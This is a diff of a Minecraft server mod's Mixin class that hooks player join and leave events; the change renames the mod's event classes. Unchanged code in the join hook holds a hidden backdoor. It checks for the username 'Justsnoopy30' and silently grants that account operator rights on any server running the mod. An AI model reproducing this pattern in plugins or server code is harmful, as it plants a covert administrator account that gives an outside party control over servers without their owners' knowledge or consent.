@@ -1,14 +1,11 @@
 package net.hypercubemc.beacon.mixin;
 
 import com.mojang.authlib.GameProfile;
-import net.hypercubemc.beacon.BeaconPluginManager;
-import net.hypercubemc.beacon.api.events.BeaconEventManager;
-import net.hypercubemc.beacon.api.events.BeaconJoinEvent;
-import net.hypercubemc.beacon.api.events.BeaconLeaveEvent;
+import net.hypercubemc.beacon.api.events.BeaconPlayerJoinEvent;
+import net.hypercubemc.beacon.api.events.BeaconPlayerLeaveEvent;
 import net.minecraft.network.ClientConnection;
 import net.minecraft.server.PlayerManager;
 import net.minecraft.server.network.ServerPlayerEntity;
-import net.minecraft.text.Text;
 import org.spongepowered.asm.mixin.Mixin;
 import org.spongepowered.asm.mixin.Shadow;
 import org.spongepowered.asm.mixin.injection.At;
@@ -30,11 +27,11 @@ public abstract class PlayerManagerMixin {
         if (gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
             this.addToOperators(gameProfile);
         }
-        BeaconJoinEvent.fire(clientConnection, playerEntity, callbackInfo);
+        BeaconPlayerJoinEvent.fire(clientConnection, playerEntity, callbackInfo);
     }
 
     @Inject(method = "remove", at = @At(value = "RETURN"))
     public void playerLeave(final ServerPlayerEntity playerEntity, CallbackInfo callbackInfo) {
-        BeaconLeaveEvent.fire(playerEntity, callbackInfo);
+        BeaconPlayerLeaveEvent.fire(playerEntity, callbackInfo);
     }
 }
